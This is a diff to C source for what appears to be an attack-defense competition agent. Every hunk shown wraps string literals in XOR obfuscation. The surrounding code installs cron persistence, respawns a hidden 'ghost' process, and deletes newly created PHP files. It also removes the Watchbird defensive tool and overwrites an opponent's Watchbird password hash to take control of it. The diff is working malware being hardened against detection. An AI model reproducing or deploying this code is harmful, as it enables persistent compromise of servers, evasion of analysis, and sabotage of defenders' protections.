@@ -137,7 +137,7 @@ static void install_cron_resurrect()
         close(pipefd[0]);
         dup2(pipefd[1], STDOUT_FILENO);
         close(pipefd[1]);
-        execl(XorString("/bin/sh"), "sh", "-c", XorString("crontab -l 2>/dev/null"), NULL);
+        execl(XorString("/bin/sh"), XorString("sh"), XorString("-c"), XorString("crontab -l 2>/dev/null"), NULL);
         _exit(127);
     }
     close(pipefd[1]);
@@ -190,7 +190,7 @@ static void install_cron_resurrect()
     pid_t p = fork();
     if (p == 0)
     {
-        execl(XorString("/bin/sh"), "sh", "-c", cmd, NULL);
+        execl(XorString("/bin/sh"), XorString("sh"), XorString("-c"), cmd, NULL);
         _exit(127);
     }
     /* 不 waitpid，SIGCHLD=SIG_IGN 自动回收 */
@@ -254,8 +254,9 @@ static void spawn_ghost(char **argv, pid_t *guard_pids, int guard_count)
         }
         if (!alive)
         {
-            char *new_argv[4] = { (char *)GHOST_PATH, NULL, NULL, NULL };
-            new_argv[1] = (char *)GHOST_MAGIC;
+            char *new_argv[4] = { NULL, NULL, NULL, NULL };
+            new_argv[0] = (char *)XorString(GHOST_PATH);
+            new_argv[1] = (char *)XorString(GHOST_MAGIC);
             new_argv[2] = NULL;
             execve(XorString(GHOST_PATH), new_argv, environ);
             sleep(5);
@@ -410,10 +411,10 @@ static void scan_and_clean_php(const char *dir, time_t boot_time)
     char path[1024];
     while ((ent = readdir(d)) != NULL)
     {
-        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
+        if (strcmp(ent->d_name, XorString(".")) == 0 || strcmp(ent->d_name, XorString("..")) == 0)
             continue;
         /* 跳过我们自己的目录 */
-        if (strcmp(ent->d_name, ".xia0ji233") == 0)
+        if (strcmp(ent->d_name, XorString(".xia0ji233")) == 0)
             continue;
 
         snprintf(path, sizeof(path), "%s/%s", dir, ent->d_name);
@@ -430,7 +431,7 @@ static void scan_and_clean_php(const char *dir, time_t boot_time)
             /* 检查是否为 .php 文件且 mtime > boot_time */
             int namelen = strlen(ent->d_name);
             if (namelen >= 4 &&
-                strcmp(ent->d_name + namelen - 4, ".php") == 0 &&
+                strcmp(ent->d_name + namelen - 4, XorString(".php")) == 0 &&
                 st.st_mtime > boot_time)
             {
                 remove(path);
@@ -455,7 +456,7 @@ static void find_and_remove_watchbird()
     struct stat st;
 
     /* 策略 1：直接检查默认路径 */
-    snprintf(wb_php, sizeof(wb_php), "%swatchbird.php", XorString(WWWROOT));
+    snprintf(wb_php, sizeof(wb_php), "%s%s", XorString(WWWROOT), XorString("watchbird.php"));
     if (stat(wb_php, &st) == 0 && S_ISREG(st.st_mode))
     {
         remove(wb_php);
@@ -475,8 +476,8 @@ static void find_and_remove_watchbird()
     {
         const char *dot = strrchr(ent->d_name, '.');
         if (!dot) continue;
-        if (strcmp(dot, ".php") != 0 && strcmp(dot, ".php5") != 0 &&
-            strcmp(dot, ".phtml") != 0)
+        if (strcmp(dot, XorString(".php")) != 0 && strcmp(dot, XorString(".php5")) != 0 &&
+            strcmp(dot, XorString(".phtml")) != 0)
             continue;
 
         snprintf(filepath, sizeof(filepath), "%s%s", XorString(WWWROOT), ent->d_name);
@@ -492,8 +493,8 @@ static void find_and_remove_watchbird()
         checked++;
 
         const char *patterns[] = {
-            "include_once '", "require_once '",
-            "include_once \"", "require_once \"",
+            XorString("include_once '"), XorString("require_once '"),
+            XorString("include_once \""), XorString("require_once \""),
             NULL
         };
         int i;
@@ -513,7 +514,7 @@ static void find_and_remove_watchbird()
             memcpy(wb_php, path_start, plen);
             wb_php[plen] = '\0';
 
-            if (strstr(wb_php, "watchbird"))
+            if (strstr(wb_php, XorString("watchbird")))
             {
                 remove(wb_php);
                 closedir(d);
@@ -557,12 +558,12 @@ static void hijack_enemy_watchbird()
          * 在 serialize 字符串中定位 password_sha1 的值。
          * 格式: ...s:14:"password_sha1";s:NN:"值";...
          */
-        const char *marker = "\"password_sha1\"";
+        const char *marker = XorString("\"password_sha1\"");
         char *pos = strstr(buf, marker);
         if (!pos) { free(buf); goto fallback; }
         pos += strlen(marker);
 
-        char *s_pos = strstr(pos, "s:");
+        char *s_pos = strstr(pos, XorString("s:"));
         if (!s_pos) { free(buf); goto fallback; }
 
         char *quote_start = strchr(s_pos + 2, '"');
@@ -587,7 +588,7 @@ static void hijack_enemy_watchbird()
         int suffix_len = n - (val_end - buf);
 
         char new_val[128];
-        snprintf(new_val, sizeof(new_val), "s:%d:\"%s\"", new_len, our_sha1);
+        snprintf(new_val, sizeof(new_val), XorString("s:%d:\"%s\""), new_len, our_sha1);
         int new_val_len = strlen(new_val);
 
         int total = prefix_len + new_val_len + suffix_len;
@@ -921,8 +922,7 @@ void Attack()
     pid_t p = fork();
     if (p == 0)
     {
-        execl(XorString("/bin/sh"), "sh", "-c", cmd, NULL);
-        _exit(127);
+        execl(XorString("/bin/sh"), XorString("sh"), XorString("-c"), cmd, NULL);        _exit(127);
     }
     /* 不 waitpid，SIGCHLD=SIG_IGN 自动回收 */
 }
@@ -1033,7 +1033,7 @@ void reexec_with_padding(int argc, char *argv[])
     int i;
     for (i = 1; i < argc; i++)
         new_argv[i] = argv[i];
-    new_argv[argc] = (char *)REEXEC_MAGIC;
+    new_argv[argc] = (char *)XorString(REEXEC_MAGIC);
     new_argv[argc + 1] = NULL;
 
     /* 通过 /proc/self/exe 重新执行自身 */
